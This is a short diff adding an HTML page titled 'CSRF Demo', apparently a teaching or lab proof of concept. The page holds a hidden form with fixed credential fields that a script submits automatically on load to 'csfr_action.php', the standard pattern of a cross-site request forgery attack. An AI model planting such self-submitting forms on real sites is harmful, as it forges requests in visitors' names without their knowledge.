@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Demo</title>
+  </head>
+  <body>
+    <form id="csrfForm" action="csfr_action.php" method="POST">
+      <input type="hidden" name="username" value="host" />
+      <input type="hidden" name="password" value="password" />
+      <input type="hidden" name="submit" value="Submit Form" />
+    </form>
+    <script>document.getElementById('csrfForm').submit();</script>
+  </body>
+</html>
